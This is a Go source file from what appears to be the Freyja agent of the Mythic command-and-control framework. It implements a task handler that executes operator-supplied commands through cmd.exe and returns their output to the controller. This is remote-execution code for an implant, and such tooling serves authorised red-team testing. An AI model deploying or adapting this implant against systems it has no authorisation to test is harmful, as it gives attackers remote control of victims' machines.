package cmd_executor

import (
	// Standard
	"bytes"
	"os/exec"

	// Freyja

	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/pkg/utils/structs"
)

//Run - Function that executes the cmd_executor command
func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID
	cmdBin := "cmd"
	arg1 := "/C"
	if _, err := exec.LookPath(cmdBin); err != nil {
			msg.SetError("Could not find cmd.exe")
			task.Job.SendResponses <- msg
			return
	}

	cmd := exec.Command(cmdBin, arg1, task.Params)
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	err := cmd.Run()
	var outputString string
	if out.String() == "" {
		outputString = "Command processed (no output)."
	} else {
		outputString = out.String()
	}
	msg.UserOutput = outputString
	msg.Completed = true
	if err != nil {
		msg.Status = "error"
		msg.UserOutput += "\n" + err.Error()
	}
	task.Job.SendResponses <- msg
	return
}
